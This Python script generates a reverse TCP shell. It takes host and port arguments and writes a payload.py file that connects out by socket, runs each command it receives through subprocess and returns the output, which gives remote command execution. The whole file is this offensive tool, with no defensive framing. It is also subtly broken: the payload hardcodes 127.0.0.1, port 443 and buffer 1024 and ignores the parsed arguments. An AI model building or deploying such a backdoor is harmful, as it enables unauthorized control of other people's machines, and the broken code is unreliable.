#!/usr/bin/env python

from os import getcwd
from colorama import init
from termcolor import colored
import argparse

init()

ap = argparse.ArgumentParser(add_help=False)
ap.add_argument("-h", "--host", required=True, help="host IP")
ap.add_argument("-p", "--port", required=True, help="host Port")
ap.add_argument("-b", "--buffersize", help="buffer size, can be 1024, 2048 ... (if not specified, default value is 1024)")
ap.add_argument("-d", "--destination", help="destination path where to store payload at (if not specified, it will be stored in teh cwd by default")
args = vars(ap.parse_args())

print(colored("[PROCESS]", "yellow"), "Generating reverse TCP payload ...")

host = args["host"]
try:
    port = int(args["port"])
except:
    print(colored("[CRITICAL]", "red"), "Please enter a correct port ! Quitting ...")
    exit()
if args["buffersize"] != None:
    try:
        buff_size = int(args["buffersize"])
    except:
        print(colored("[CRITICAL]", "red"), "Please enter a correct buffersize or leave it as default ! Quitting ...")
        exit()
if args["buffersize"] == None:
    buff_size = 1024
if args["destination"] != None:
    dest = args["destination"] + "\payload.py"
if args["destination"] == None:
    dest = getcwd() + "\payload.py"

payload = open(dest, "w+")
print(colored("[PROCESS]", "yellow"), "Successfully initialized payload file, writing payload ...")
payload.write("import socket, subprocess\nhost = '127.0.0.1'\nport = 443\nbuff_size = 1024\ns = socket.socket()\ns.connect((host, port))\nwhile True:\n    cmd = s.recv(buff_size).decode('UTF-8')\n    if cmd.lower() == 'exit' or cmd.lower() == 'quit':\n        break\n    try:\n        s.send(subprocess.getoutput(cmd).encode('UTF-8'))\n    except:\n        s.send('[WARNING] Failed to execute remote command ...'.encode('UTF-8'))\ns.close()")
payload.close()
print(colored("[SUCCESS]", "green"), "Successfully wrote reverse TCP payload to file %s !" % (dest))